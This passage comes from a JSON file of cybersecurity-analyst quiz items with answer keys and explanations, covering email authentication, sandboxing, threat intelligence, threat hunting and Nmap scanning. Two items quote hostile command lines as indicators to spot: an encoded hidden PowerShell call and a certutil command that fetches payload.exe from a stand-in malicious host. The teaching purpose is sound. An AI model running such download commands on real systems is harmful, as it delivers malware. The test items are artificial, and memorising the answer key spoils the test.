zero-day malware to slip past defenses. Option B is unlikely when specific dangerous APIs are present in the import address table, and Option D is false because WriteProcessMemory is heavily restricted and rarely used by standard user utilities.","l":"c3-filesandbox","l2":"","k":""},{"id":"lq:c3-filesandbox:6","set":"lq","ch":3,"d":1,"q":"Which email control checks whether a sending IP is authorized by a domain?","o":["DKIM","SPF","DMARC","S/MIME"],"a":1,"e":"SPF publishes authorized sending IPs. DKIM signs content, DMARC aligns and applies policy, and S/MIME uses certificates.","l":"c3-filesandbox","l2":"","k":""},{"id":"lq:c3-filesandbox:7","set":"lq","ch":3,"d":1,"q":"An analyst investigates a suspicious invoice email. MXToolbox and email header inspection show that SPF, DKIM, and DMARC all report \"PASS\". However, the sending domain is \"paypa1-services.com\" rather than the authentic \"paypal.com\". What is the BEST conclusion?","o":["The email is authentic because DKIM cryptographic signatures cannot be generated for spoofed domains.","The email gateway experienced a DNS resolution timeout and assigned a default pass status.","The email is malicious; SPF and DKIM pass because the attacker legitimately controls DNS for the lookalike domain.","The email sender passed DMARC alignment, proving the display name matches the authentic corporate entity."],"a":2,"e":"SPF, DKIM, and DMARC validate that an email originated from an authorized server for the specific domain listed in the headers. However, if an attacker purchases a typo-squatted, lookalike domain (e.g., paypa1-services.com) and properly configures public DNS TXT records and DKIM keys for that lookalike domain, all authentication checks will pass! Analysts must not equate \"SPF/DKIM PASS\" with \"benign message\"; domain reputation and context are essential. Option A is the classic technical trap: DKIM proves the domain was not forged in transit, but does not prove the domain itself is trustworthy. Option D is incorrect because DMARC alignment evaluates domain identifiers, not the human-readable display name.","l":"c3-filesandbox","l2":"","k":""},{"id":"lq:c3-filesandbox:8","set":"lq","ch":3,"d":1,"q":"Which environment provides the SAFEST configuration for executing dynamic behavioral analysis of suspected malware extracted from an active corporate breach?","o":["A dedicated test workstation connected to the corporate staging VLAN with administrative credentials","A public multi-tenant cloud sandbox configured with default internet routing and shared storage","A virtual machine hosted on an analyst laptop utilizing bridged network adapter configuration","An isolated internal sandbox on a dedicated physical host with non-persistent snapshots and severed network routes"],"a":3,"e":"Malware analysis requires strict containment. An isolated internal sandbox hosted on dedicated hardware (or an air-gapped network) with non-persistent, read-only snapshots and disabled production routing prevents malware from spreading laterally, beaconing to external C2, or leaking sensitive incident evidence. Option B is tempting for convenience, but uploading incident samples to public sandboxes leaks proprietary corporate evidence. Option A allows worm-like malware or ransomware to attack internal staging servers. Option C exposes the analyst workstation to VM escape or local network ARP poisoning via bridged networking.","l":"c3-filesandbox","l2":"","k":""},{"id":"lq:c3-uba-scripting:1","set":"lq","ch":3,"d":1,"q":"An employee account authenticates during normal working hours but suddenly initiates bulk downloads of sensitive proprietary source code repositories that the user has never accessed before. Which analytical approach is BEST suited to detect this anomaly?","o":["User and Entity Behavior Analytics (UEBA) baseline anomaly scoring","Signature-based antivirus scanning of local cache files","Static YARA rule pattern matching against disk storage","Egress firewall packet inspection matching destination TCP port 443"],"a":0,"e":"UEBA detects behavioral anomalies by comparing an entity's current actions against their historical baseline and peer group activity, making it ideal for identifying compromised credentials or insider threats where valid logins access atypical resources. Antivirus, YARA, and firewall port inspection look for known signatures or protocols rather than behavioral deviations.","l":"c3-uba-scripting","l2":"","k":""},{"id":"lq:c3-uba-scripting:2","set":"lq","ch":3,"d":1,"q":"A security operations team deploys a new behavioral analytics tool (OpenUBA) and notices an overwhelming flood of high-severity alerts on the first day of deployment. What should the engineering team do to establish effective operational alerting?","o":["Disable log ingestion across all domain controllers to stop alert generation","Allow the engine a two-to-four-week learning period to model normal behavioral baselines before activating alerts","Configure the platform to automatically isolate any endpoint associated with a behavioral anomaly","Replace the behavioral detection engine with static IP reputation blocklists"],"a":1,"e":"Behavioral analytics engines require a training period (typically two to four weeks) to ingest telemetry, calculate statistical norms, and establish accurate behavioral baselines for users and entities. Alerting before baselines are formed produces massive false positives. Disabling logs blinds defenders, automated isolation disrupts business operations, and static IP lists do not detect user credential anomalies.","l":"c3-uba-scripting","l2":"","k":""},{"id":"lq:c3-uba-scripting:3","set":"lq","ch":3,"d":1,"q":"Which command line is MOST suspicious?","o":["powershell Get-Date","Get-Process explorer","powershell -nop -w hidden -enc SQBFAFgA...","python ./report.py"],"a":2,"e":"NoProfile, hidden window, and encoded command together are strong malicious indicators, especially with a long Base64 value.","l":"c3-uba-scripting","l2":"","k":""},{"id":"lq:c3-uba-scripting:4","set":"lq","ch":3,"d":1,"q":"A security analyst is writing a Python script to parse a web server access log and extract every occurrence of an IPv4 address, including multiple matches within a single log line. Which function from the Python <code>re</code> module should the analyst use?","o":["re.search()","re.match()","re.split()","re.findall()"],"a":3,"e":"The <code>re.findall()</code> function returns all non-overlapping matches of a pattern in a string as a list of strings. <code>re.search()</code> only returns the first match, <code>re.match()</code> checks only the beginning of the string, and <code>re.split()</code> splits a string by occurrences of the pattern.","l":"c3-uba-scripting","l2":"","k":""},{"id":"lq:c3-uba-scripting:5","set":"lq","ch":3,"d":1,"q":"An analyst investigating a living-off-the-land attack on a Windows endpoint needs to correlate process creation events with the full, de-obfuscated script code executed in PowerShell. Which combination of Windows Event Logs provides this telemetry?","o":["Windows Security Event ID 4688 and Microsoft-Windows-PowerShell Operational Event ID 4104","Windows System Event ID 7045 and DNS Client Events Event ID 3008","Windows Security Event ID 4624 and TaskScheduler Operational Event ID 106","Windows Security Event ID 1102 and Windows Application Event ID 1000"],"a":0,"e":"Event ID 4688 (Process Creation) records when powershell.exe is spawned, including parent process information and command-line arguments. Event ID 4104 (Script Block Logging) records complete, decoded blocks of executed PowerShell code, capturing obfuscated commands after dynamic runtime expansion. Event ID 7045 records new service installations, and Event ID 4624 records successful logons.","l":"c3-uba-scripting","l2":"","k":""},{"id":"lq:c3-uba-scripting:6","set":"lq","ch":3,"d":1,"q":"A security analyst executes the following Linux pipeline against an SSH authentication log: <code>grep 'Failed password' auth.log | awk '{print $11}' | sort | uniq -c | sort -nr | head -n 10</code>. What is the operational objective of this command?","o":["Encrypt failed authentication records and compute an HMAC integrity checksum","Filter failed login events, extract source IP addresses, and rank the top offending hosts by attempt count","Calculate the Shannon entropy of incoming SSH connection banners to detect tunneling","Simulate an automated brute-force password spray against external SSH gateways"],"a":1,"e":"The command filters for failed password lines (grep), extracts field 11 containing the source IP (awk), aggregates identical IPs with count prefixes (uniq -c), and sorts them numerically in descending order to output the top 10 most frequent attacking IPs. It does not perform encryption, calculate entropy, or launch outbound attacks.","l":"c3-uba-scripting","l2":"","k":""},{"id":"lq:c3-uba-scripting:7","set":"lq","ch":3,"d":1,"q":"Which file format is most associated with cloud API responses and AWS CloudTrail?","o":["EVTX","YAML only","JSON","Raw PCAP"],"a":2,"e":"JSON is common for APIs and cloud logs. EVTX is Windows events and YAML is commonly configuration.","l":"c3-uba-scripting","l2":"","k":""},{"id":"lq:c3-uba-scripting:8","set":"lq","ch":3,"d":1,"q":"During endpoint log analysis, an incident responder observes the command <code>certutil.exe -urlcache -split -f https://malicious-domain.com/payload.exe C:\\Windows\\Temp\\update.exe</code>. How should the responder interpret this activity?","o":["A standard administrative synchronization of the local Certificate Revocation List (CRL)","An offline export of private encryption keys from the Windows certificate store","An automated DNS zone transfer request initiated via the Windows cryptographic subsystem","Living-off-the-land binary (LOLBin) abuse to download an external executable payload"],"a":3,"e":"Certutil is a legitimate built-in Windows utility for managing certificates, but adversaries frequently abuse its <code>-urlcache -split -f</code> parameters as a living-off-the-land binary (LOLBin) to download malicious files from external servers while evading perimeter restrictions. It is not an export of private keys or a CRL sync.","l":"c3-uba-scripting","l2":"","k":""},{"id":"lq:c4-collect:1","set":"lq","ch":4,"d":1,"q":"A threat report is current and accurate but describes software the organization does not use. Which quality dimension is weakest?","o":["Relevance","Timeliness","Accuracy","Dissemination"],"a":0,"e":"The information does not apply to the environment, so relevance is weak even though it is current and reliable.","l":"c4-collect","l2":"","k":""},{"id":"lq:c4-collect:2","set":"lq","ch":4,"d":1,"q":"Which threat intelligence source represents closed-source (proprietary) intelligence rather than open-source intelligence (OSINT)?","o":["A technical security bulletin published openly by a national Computer Emergency Response Team (CERT)","A commercial threat subscription delivering proprietary adversary campaign tracking and vetted indicators","A public cybersecurity research blog analyzing reverse-engineered ransomware samples","An automated open feed aggregating passive DNS query resolutions and WHOIS registrations"],"a":1,"e":"Closed-source threat intelligence consists of proprietary data produced by commercial cybersecurity research teams, available only via paid subscription or vetted private sharing communities. Option A is tempting because CERT advisories are authoritative, but they are published openly to the public, classifying them as OSINT. Options C and D are freely accessible public information repositories.","l":"c4-collect","l2":"","k":""},{"id":"lq:c4-collect:3","set":"lq","ch":4,"d":1,"q":"An analyst must transport structured threat objects between intelligence platforms. Which pairing is correct?","o":["TAXII is the format and STIX is the transport","TLP is the format and OSINT is the transport","STIX is the format and TAXII is the transport","OpenIOC is the transport and TLP is the format"],"a":2,"e":"STIX describes the information; TAXII exchanges it, commonly over HTTPS.","l":"c4-collect","l2":"","k":""},{"id":"lq:c4-collect:4","set":"lq","ch":4,"d":1,"q":"A financial sector partner shares a sensitive threat bulletin containing indicators of an active zero-day campaign, marked with the Traffic Light Protocol tag TLP:RED. What is the REQUIRED handling procedure for this intelligence?","o":["Restricted strictly to the individual named human recipients present in the specific meeting or distribution","Permitted for distribution across all internal employees and contracted support personnel on a need-to-know basis","Shareable with trusted peer organizations and partner security operations centers across the financial sector","Authorized for public dissemination via security blogs to alert external industry stakeholders"],"a":0,"e":"Under FIRST TLP 2.0 guidelines, TLP:RED is restricted exclusively to individual named recipients present in the discussion or exchange; it cannot even be shared broadly within the recipient organization. Option B describes TLP:AMBER (or TLP:AMBER+STRICT, which restricts to the organization only). Option C describes TLP:GREEN (sharing within the sector community or peers). Option D describes TLP:CLEAR (formerly TLP:WHITE, unconstrained public disclosure).","l":"c4-collect","l2":"","k":""},{"id":"lq:c4-collect:5","set":"lq","ch":4,"d":1,"q":"Which intelligence-cycle phase turns unformatted reports into data tools can consume?","o":["Direction","Processing","Dissemination","Feedback"],"a":1,"e":"Processing normalizes and prepares collected data. Direction defines requirements and dissemination delivers results.","l":"c4-collect","l2":"","k":""},{"id":"lq:c4-collect:6","set":"lq","ch":4,"d":1,"q":"An enterprise relies on a single commercial threat intelligence feed. When a critical remote code execution zero-day vulnerability is actively exploited against enterprise infrastructure, the security team realizes their primary vendor feed has not published detection signatures after two weeks. What is the BEST process improvement to eliminate this risk?","o":["Ingest multiple corroborated threat feeds and maintain internal detection engineering capabilities to avoid single-vendor dependency.","Disable external threat feeds until the primary commercial provider publishes verified detection updates.","Wait for the primary vendor to publish signatures before taking any defensive mitigation measures.","Reclassify zero-day alerts as low priority until commercial antivirus vendors confirm broad commodity distribution."],"a":0,"e":"Relying on a single threat intelligence feed creates a critical single point of failure. Maintaining diverse threat intelligence feeds (combining commercial, open-source, and ISAC feeds) and building internal detection engineering capacity (such as authoring custom YARA or Sigma rules) ensures the SOC can defend against emerging threats without waiting on vendor signatures. Option C is the primary operational trap: delaying containment while waiting for vendor signatures leaves the organization exposed to ongoing exploitation. Option B blinds the SOC to all other threat indicators, and Option D dangerously downplays confirmed active threats.","l":"c4-collect","l2":"","k":""},{"id":"lq:c4-collect:7","set":"lq","ch":4,"d":1,"q":"A threat intelligence analyst discovers an unverified post on an anonymous underground forum claiming that a specific IP address is acting as a C2 node for an upcoming campaign. No commercial feeds, CERT bulletins, or internal logs corroborate this claim. What is the BEST immediate action for the analyst to take?","o":["Deploy an immediate perimeter firewall block across the entire Class B subnet containing the IP address.","Permanently delete the indicator because unverified forum rumors degrade intelligence repository quality.","Publish an emergency TLP:RED advisory to national critical infrastructure sharing communities.","Ingest the IP address as a low-confidence indicator for internal monitoring and search for corroborating evidence."],"a":3,"e":"Threat intelligence requires confidence scoring. Unverified indicators from anonymous or low-reputation sources should be recorded with a low confidence score, enabling passive monitoring, alerting, or threat hunting without triggering disruptive operational blocks. Option A is the classic knee-jerk trap: automatically blocking uncorroborated low-confidence indicators risks breaking legitimate traffic and causing self-inflicted denial of service. Option B prematurely discards potentially valuable early-warning data. Option C spreads unvalidated rumors as emergency intelligence, undermining organizational credibility.","l":"c4-collect","l2":"","k":""},{"id":"lq:c4-collect:8","set":"lq","ch":4,"d":1,"q":"Which source is public OSINT even though normal search engines do not index it?","o":["Dark-web monitoring","A private vendor report","An internal EDR alert","A restricted partner feed"],"a":0,"e":"Dark-web content is publicly accessible with appropriate tools and is treated as OSINT, though validation is difficult.","l":"c4-collect","l2":"","k":""},{"id":"lq:c4-classify:1","set":"lq","ch":4,"d":1,"q":"An intrusion uses custom malware, redundant persistence, quiet lateral movement, and months of access. Which actor profile is MOST likely?","o":["APT","Script kiddie","Hacktivist","Accidental insider"],"a":0,"e":"Advanced custom capability, patience, stealth, and long dwell are classic APT clues.","l":"c4-classify","l2":"","k":""},{"id":"lq:c4-classify:2","set":"lq","ch":4,"d":1,"q":"An employee with valid access intentionally copies customer data to a USB drive for payment. What is this?","o":["Supply chain compromise","Intentional insider threat","Script kiddie activity","A passive OSINT event"],"a":1,"e":"The actor has authorized access and deliberately misuses it for financial gain, which is an intentional insider threat.","l":"c4-classify","l2":"","k":""},{"id":"lq:c4-classify:3","set":"lq","ch":4,"d":1,"q":"A question asks why an attacker wants access, while another asks which method they used. Which ATT&CK terms answer these?","o":["Technique, then tactic","Procedure, then tactic","Tactic, then technique","Indicator, then campaign"],"a":2,"e":"A tactic is the goal or why; a technique is the method or how.","l":"c4-classify","l2":"","k":""},{"id":"lq:c4-classify:4","set":"lq","ch":4,"d":1,"q":"Which detection is MOST durable when an APT rotates its IP addresses and hashes?","o":["A single IP block","A single file hash","A domain allowlist","TTP and behavioral detection"],"a":3,"e":"TTPs are harder for attackers to change and sit at the top of the Pyramid of Pain.","l":"c4-classify","l2":"","k":""},{"id":"lq:c4-classify:5","set":"lq","ch":4,"d":1,"q":"A threat intelligence team overlays an adversary's ATT&CK technique matrix against internal detection capabilities in ATT&CK Navigator. The adversary layer highlights Credential Dumping (T1003) as high priority, but the defensive coverage layer reveals no corresponding data source or detection rule. What should the SOC do FIRST?","o":["Execute an aggressive uncredentialed port scan against internal Active Directory domain controllers","Prioritize deploying required telemetry sources and develop detection analytics to close the visibility gap","Delete the adversary technique layer in Navigator to clear the unmonitored indicator","Implement perimeter firewall block rules against all known public cloud provider IP ranges"],"a":1,"e":"Threat coverage mapping in ATT&CK Navigator identifies critical defensive blind spots where active threat actors utilize techniques that internal logging cannot detect. The team must engineer logging and detection rules to close the collection gap. Deleting visualization layers ignores the risk, and scanning domain controllers or blocking cloud ranges does not address host credential dumping.","l":"c4-classify","l2":"","k":""},{"id":"lq:c4-classify:6","set":"lq","ch":4,"d":1,"q":"A cyber threat intelligence analyst is compiling an attribution report for executive leadership following a state-sponsored intrusion. Which evidence provides the STRONGEST technical foundation for attributing the intrusion to a specific threat group?","o":["Public news claims published on third-party security blogs without corroborating indicators","Geographic location coordinates derived solely from commercial IP address lookups","Shared malware code artifacts, cryptographic hashing patterns, and overlapping C2 infrastructure","High-level geopolitical motives documented in national foreign policy whitepapers"],"a":2,"e":"Technical attribution relies on concrete digital artifacts, such as shared source code functions, unique compile-time artifacts, custom cryptographic routines, and overlapping command-and-control server infrastructure observed across multiple campaigns. Geopolitical motivations provide strategic context but not technical proof, and commercial IP lookups easily reflect attacker proxies or compromised relays.","l":"c4-classify","l2":"","k":""},{"id":"lq:c4-classify:7","set":"lq","ch":4,"d":1,"q":"A system design allows a user to deny changing a record because logs are editable. Which STRIDE category is this?","o":["Spoofing","Tampering","Denial of Service","Repudiation"],"a":3,"e":"Repudiation is denying an action without trustworthy proof. Immutable centralized logs provide the countermeasure.","l":"c4-classify","l2":"","k":""},{"id":"lq:c4-classify:8","set":"lq","ch":4,"d":1,"q":"A web service exposes confidential records through a public cloud bucket. Which STRIDE category fits BEST?","o":["Information Disclosure","Elevation of Privilege","Spoofing","Repudiation"],"a":0,"e":"Unauthorized exposure of sensitive data is Information Disclosure; cloud access controls and data discovery help mitigate it.","l":"c4-classify","l2":"","k":""},{"id":"lq:c4-hunt:1","set":"lq","ch":4,"d":1,"q":"A threat intelligence report details a novel persistence technique (T1543.003) being actively deployed against organizations in the same industry sector. The enterprise SIEM displays zero alerts matching this activity. What is the BEST next action for the security operations team?","o":["Formulate a hunt hypothesis based on the ATT&CK technique and search historical endpoint telemetry for indicators.","Assume the enterprise is secure because automated SIEM correlation rules generated zero detection alerts.","Increase the polling frequency of external commercial threat intelligence feeds to check for signature updates.","Submit an emergency request to IT operations to re-image all enterprise domain controllers."],"a":0,"e":"Threat hunting is inherently proactive and assumes compromise. When threat reports surface novel adversary TTPs that existing automated detection rules do not flag, hunters formulate a testable hypothesis (e.g., \"Adversaries have registered unauthorized services in our environment\") and query historical endpoint telemetry (EDR/Sysmon) to uncover previously undetected intrusions. Option B is the primary dangerous trap: absence of alerts often reflects a detection gap rather than an absence of compromise. Option C is passive and relies on external feeds, while Option D takes drastic operational containment without evidence of intrusion.","l":"c4-hunt","l2":"","k":""},{"id":"lq:c4-hunt:2","set":"lq","ch":4,"d":1,"q":"A security analyst receives an alert containing an unfamiliar external IP address from a threat intelligence feed. Which sequence represents the BEST workflow before initiating an edge firewall block?","o":["Immediately execute an automated IP block and open a retrospective incident ticket.","Validate the source confidence, enrich with WHOIS and passive DNS, assess internal exposure, and decide whether to alert or block.","Discard the indicator immediately because atomic indicators cannot be mapped to the MITRE ATT&CK framework.","Publish the indicator to public threat intelligence repositories without internal correlation."],"a":1,"e":"Proper intelligence-driven response requires validation and enrichment before taking disruptive action. Analysts must verify source reliability and confidence score, enrich with context (WHOIS, passive DNS, associated malware families), check internal SIEM logs for historical connections, and weigh the risk of false-positive disruption before enforcing network blocks. Option A is tempting for rapid response, but knee-jerk blocking of unvalidated IPs risks severing legitimate business services (such as shared CDNs or cloud APIs). Option C incorrectly dismisses atomic indicators that provide valuable initial pivots, and Option D leaks internal investigation focus.","l":"c4-hunt","l2":"","k":""},{"id":"lq:c4-hunt:3","set":"lq","ch":4,"d":1,"q":"Which detection is MOST durable against an attacker who rotates hashes and IPs?","o":["A single file hash","A single source IP","A behavioral TTP pattern","A short-lived domain"],"a":2,"e":"Behavioral indicators and TTPs are harder to change and sit higher on the Pyramid of Pain.","l":"c4-hunt","l2":"","k":""},{"id":"lq:c4-hunt:4","set":"lq","ch":4,"d":1,"q":"A threat hunting team completes a two-week proactive investigation hunting for Kerberoasting activity across internal Active Directory domains. The team finds zero evidence of active adversary compromise, but discovers that Kerberos Service Principal Name (SPN) audit logging was disabled across domain controllers. How should this threat hunt be evaluated?","o":["The hunt was unsuccessful because an investigation is only valuable if it discovers active malware or intrusion.","The hunt was invalid because proactive hunting exercises are strictly limited to analyzing existing SIEM alerts.","The hunt was inconclusive because threat hunts cannot be validated without capturing live attacker network packets.","The hunt was successful because proving a technique absent, discovering visibility gaps, and improving detection posture are core hunt objectives."],"a":3,"e":"A threat hunt does not require finding active malware to be successful. Proving with high confidence that a specific technique is absent, uncovering critical logging and telemetry blind spots, and enabling new detection engineering rules (such as enabling Kerberos SPN request auditing) are primary successes of modern threat hunting programs. Option A is the common operational misconception: viewing a \"clean\" hunt as a failure overlooks the measurable security hardening and visibility gains delivered by the hunt. Options B and C misrepresent threat hunting scope and validation criteria.","l":"c4-hunt","l2":"","k":""},{"id":"lq:c4-hunt:5","set":"lq","ch":4,"d":1,"q":"Which IoC should normally be handled alert-only first because confidence is low?","o":["A honeytoken access event","A single uncorroborated IP from an anonymous source","A confirmed malware hash from multiple trusted sources","A known malicious domain with repeated internal hits"],"a":1,"e":"Low-confidence indicators need confirmation before blocking. The other choices have stronger corroborating or inherently suspicious evidence.","l":"c4-hunt","l2":"","k":""},{"id":"lq:c4-hunt:6","set":"lq","ch":4,"d":1,"q":"A SOC analyst receives an alert indicating that a hidden administrative service account honeytoken credential was submitted in an authentication request to an internal server. What is the MOST accurate interpretation of this alert?","o":["A benign operational anomaly caused by an automated Active Directory background replication task","A transient DNS resolution error resulting from split-horizon domain lookup failures","High-confidence evidence of adversary credential dumping and lateral movement","A routine system maintenance event generated by enterprise backup agents"],"a":2,"e":"A honeytoken is a fictitious, decoy digital asset (such as an unused service account password or fake API token) with zero legitimate business purpose. Because no legitimate employee or background process ever uses the credential, any interaction with a honeytoken provides near 100% true-positive confidence of unauthorized adversary reconnaissance, memory dumping, or lateral movement. Option D (a routine backup operation) is a classic distractor; legitimate backup agents use dedicated, documented service accounts, never decoy honeytokens. Options A and B describe benign network and directory behaviors that never touch deliberately planted fake credentials.","l":"c4-hunt","l2":"","k":""},{"id":"lq:c4-hunt:7","set":"lq","ch":4,"d":1,"q":"A cyber defense team is designing a deception deployment to capture detailed adversary post-exploitation toolkits, privilege escalation scripts, and lateral movement commands. Which deception asset provides the richest behavioral intelligence, while demanding the strictest containment controls?","o":["A low-interaction honeypot simulating open TCP ports and service banners","A passive darknet monitoring unused IP space for unsolicited SYN packets","A synthetic honeytoken embedded into an unprivileged user desktop configuration","A high-interaction honeypot running an authentic operating system and real applications"],"a":3,"e":"A high-interaction honeypot deploys full, real operating systems and applications. Because adversaries interact with authentic software, defenders observe the adversary's complete post-exploitation tradecraft, custom scripts, and memory payloads. However, because it runs real code, if an attacker compromises the honeypot, they could use it as a pivot point, necessitating strict network isolation (such as dedicated VLANs and egress filtering). Option A is tempting because honeypots simulate services, but low-interaction honeypots only emulate basic network responses, revealing little beyond initial connection attempts. Options B and C are lightweight detective controls that do not capture interactive adversary command sequences.","l":"c4-hunt","l2":"","k":""},{"id":"lq:c4-hunt:8","set":"lq","ch":4,"d":1,"q":"A cloud threat hunter investigates suspected privilege escalation involving unauthorized cross-account administrative access within an AWS organization. Which telemetry source is the MOST critical for this investigation?","o":["AWS CloudTrail management event logs recording AssumeRole and AssumeRoleWithSAML API calls","Amazon VPC Flow Logs recording rejected TCP connection attempts across database subnets","AWS GuardDuty findings summarizing anomalous external DNS query frequencies from EC2 instances","Amazon CloudWatch infrastructure metrics tracking hypervisor CPU utilization spikes"],"a":0,"e":"In AWS environments, cross-account access and administrative role assumption are executed via AWS Security Token Service (STS) API calls, specifically AssumeRole or AssumeRoleWithSAML. AWS CloudTrail records control plane management events, documenting the requesting IAM identity, source IP address, target role ARN, and session tokens. Option B is tempting because network traffic can reveal lateral movement, but VPC Flow Logs only capture Layer 4 IP/port metadata and cannot inspect cloud control plane API calls. Options C and D monitor DNS anomalies and compute performance, which do not track IAM role assumption transactions.","l":"c4-hunt","l2":"","k":""},{"id":"lq:c5-recon:1","set":"lq","ch":5,"d":2,"q":"A security analyst is preparing to assess an authorized /24 subnet. Which action represents the BEST first step before launching detailed vulnerability and port scans?","o":["A host-discovery ping sweep such as <code>nmap -sn</code> to identify active, responsive systems","An automated exploit assessment against every IP using Metasploit auxiliary modules","A full-connect TCP port scan targeting all 65,535 ports on all addresses simultaneously","A credentialed database vulnerability audit against the entire CIDR range"],"a":0,"e":"Performing a lightweight host discovery sweep (such as <code>nmap -sn</code>) identifies live IP addresses first, establishing an accurate target list and preventing the scanner from wasting bandwidth and time attempting heavy scans against inactive hosts. Exploits and full-range TCP scans are intrusive and belong to later assessment phases.","l":"c5-recon","l2":"","k":""},{"id":"lq:c5-recon:2","set":"lq","ch":5,"d":2,"q":"An external security assessment utilizes Masscan to rapidly scan a corporate IP range and reports TCP port 443 is open on an unexpected perimeter host. What is the BEST next step for the analyst?","o":["Assume the web service is vulnerable to remote code execution and isolate the host immediately","Perform a targeted service version scan (such as <code>nmap -sV</code>) and vulnerability assessment within scope","Execute an automated dictionary brute-force attack against the endpoint over HTTPS","Discard the result as an unvalidated false positive inherent to asynchronous packet scanners"],"a":1,"e":"Masscan is an asynchronous scanner designed for high-speed port discovery, but it does not perform deep service interrogation or vulnerability analysis. Analysts must follow up with targeted service version probes (such as <code>nmap -sV</code>) to verify service banners, SSL/TLS configurations, and potential vulnerabilities within authorized scope. Discarding the result ignores real attack surface.","l":"c5-recon","l2":"","k":""},{"id":"lq:c5-recon:3","set":"lq","ch":5,"d":2,"q":"While reviewing an automated network topology diagram generated by Zenmap, an analyst notices that an entire database subnet known to exist on the network is missing from the scan output. What is the MOST accurate interpretation of this finding?","o":["The physical network switches dropped all scan packets due to dynamic ARP inspection violations","The scanner operating system crashed and corrupted the XML output file during execution","Stateful firewalls or packet filters dropped scanner probes, demonstrating that scan topology is only an inference","Network address translation (NAT) failed to map private RFC 1918 addresses to the scanning interface"],"a":2,"e":"Network topology maps produced by scanners like Zenmap or Nmap are logical inferences based on received packet responses. When perimeter firewalls, routers, or host ACLs silently drop ICMP and TCP probes, the scanner cannot detect the hosts behind them, omitting the subnet from the resulting map. It does not mean the subnet is physically absent or that switches malfunctioned.","l":"c5-recon","l2":"","k":""},{"id":"lq:c5-recon:4","set":"lq","ch":5,"d":2,"q":"Ping fails but an authorized SYN probe returns flags=SA on 443. What is MOST likely?","o":["The host is offline","The host is only a DNS server","The application is proven patched","The host has a listening TCP port; ICMP may be filtered"],"a":3,"e":"SYN-ACK confirms a TCP listener. The missing ping reply may reflect ICMP filtering; it does not prove host failure or patch status.","l":"c5-recon","l2":"","k":""},{"id":"lq:c5-recon:5","set":"lq","ch":5,"d":2,"q":"What is safest FIRST in an industrial control network?","o":["High-speed Masscan","Passive fingerprinting","Full UDP scan","Repeated hping flood"],"a":1,"e":"Passive discovery reduces risk of destabilizing OT/ICS devices.","l":"c5-recon","l2":"","k":""},{"id":"lq:c5-recon:6","set":"lq","ch":5,"d":2,"q":"Which TCP scan is generally less visible?","o":["TCP Connect scan","Full UDP scan","SYN half-open scan","ICMP echo scan"],"a":2,"e":"SYN does not complete the handshake.","l":"c5-recon","l2":"","k":""},{"id":"lq:c5-recon:7","set":"lq","ch":5,"d":2,"q":"A security analyst is preparing to conduct an active vulnerability scan against an organization's cloud-hosted application environment. What must the analyst confirm BEFORE initiating the scan?","o":["The target virtual machines are running commercial endpoint detection and response agents","A publicly trusted digital certificate is installed on the scanning appliance","Local law enforcement has received formal advance notification of the assessment timeline","Written scope authorization has been signed and the scan conforms to the cloud provider penetration testing policy"],"a":3,"e":"Conducting vulnerability assessments or penetration tests against cloud infrastructure requires formal written authorization (Rules of Engagement) from the asset owner and strict adherence to the cloud service provider's security assessment policies. Violating provider rules can result in account suspension or legal action. Law enforcement notification is not required for authorized enterprise assessments.","l":"c5-recon","l2":"","k":""},{"id":"lq:c5-recon:8","set":"lq","ch":5,"d":2,"q":"Which tool is a lightweight GUI for checking responsive IPs across a range?","o":["Angry IP Scanner","Cuckoo Sandbox","OpenCTI","Wireshark"],"a":0,"e":"Angry IP Scanner performs simple host discovery and port checks.","l":"c5-recon","l2":"","k":""},{"id":"lq:c5-portscan:1","set":"lq","ch":5,"d":2,"q":"A security analyst is preparing a vulnerability assessment plan for an industrial manufacturing facility that includes legacy SCADA controllers and programmable logic controllers (PLCs). What discovery method should the analyst recommend to map network devices without risking operational outages?","o":["Implement passive network traffic monitoring and DHCP lease log analysis.","Execute an aggressive Nmap scan using <code>nmap -A -T4</code> across the controller subnet.","Deploy Masscan with a transmission rate of 100,000 packets per second.","Perform an unprivileged TCP Connect scan (<code>nmap -sT</code>) across all 65,535 ports."],"a":0,"e":"Fragile industrial control systems (ICS/SCADA) and legacy PLCs can easily crash or enter fail-safe states when probed by active port scanners. Passive network monitoring (inspecting SPAN port traffic, NetFlow, and DHCP logs) identifies connected devices silently without sending any disruptive network probes.","l":"c5-portscan","l2":"","k":""},{"id":"lq:c5-portscan:2","set":"lq","ch":5,"d":2,"q":"An analyst conducts an Nmap scan against an internal server and receives the following output:<br/><code>PORT     STATE    SERVICE<br/>80/tcp   open     http<br/>443/tcp  filtered https<br/>8080/tcp closed   http-proxy</code><br/>Which of the following BEST describes the state of port 443?","o":["The web server rejected the connection by returning an immediate TCP RST packet.","The service is actively accepting connections, but requires client SSL certificate authentication.","A firewall or access control list intercepted the probe, preventing Nmap from determining if the port is open or closed.","The port is operating on a dynamic registered range and cannot be probed without root privileges."],"a":2,"e":"In Nmap terminology, 'filtered' indicates that a firewall, packet filter, or router ACL intercepted the probe. Nmap cannot determine whether the port is open or closed because no response was returned, or the probe was dropped with an ICMP unreachable error.","l":"c5-portscan","l2":"","k":""},{"id":"lq:c5-portscan:3","set":"lq","ch":5,"d":2,"q":"A penetration tester needs to perform rapid external reconnaissance against a corporate domain to visually map relationships between external domain names, IP subnets, email addresses, and employee identities without sending packets directly to the client's network. Which tool is BEST suited for this task?","o":["Masscan","Zenmap","Angry IP Scanner","Maltego"],"a":3,"e":"Maltego is an interactive open-source intelligence (OSINT) and graphical link analysis tool. It queries public repositories via server-side 'transforms' to map entities (domains, IPs, email addresses, people) on an interactive relationship graph without transmitting active packets to the target's network infrastructure.","l":"c5-portscan","l2":"","k":""},{"id":"lq:c5-portscan:4","set":"lq","ch":5,"d":2,"q":"A security team must scan a large enterprise class-B network (/16 subnet containing over 65,000 IP addresses) to discover live web servers on TCP port 443 in the shortest possible time. Which tool is specifically architected for asynchronous, high-speed discovery across massive IP ranges?","o":["Masscan","Wireshark","Angry IP Scanner","Recon-ng"],"a":0,"e":"Masscan is designed for high-speed, asynchronous network scanning. By using a custom raw-socket TCP/IP stack, Masscan can transmit millions of packets per second, allowing it to scan entire subnets or the entire Internet orders of magnitude faster than conventional scanners like Nmap.","l":"c5-portscan","l2":"","k":""},{"id":"lq:c5-portscan:5","set":"lq","ch":5,"d":2,"q":"An analyst runs the command <code>nmap -sS -p 1-1024 192.168.1.100</code>. What packet sequence does Nmap transmit when probing an open port during this scan?","o":["Nmap sends SYN; the target returns SYN/ACK; Nmap sends ACK and closes with FIN.","Nmap sends SYN; the target returns SYN/ACK; Nmap immediately transmits RST to reset the connection.","Nmap sends ACK; the target returns RST; Nmap 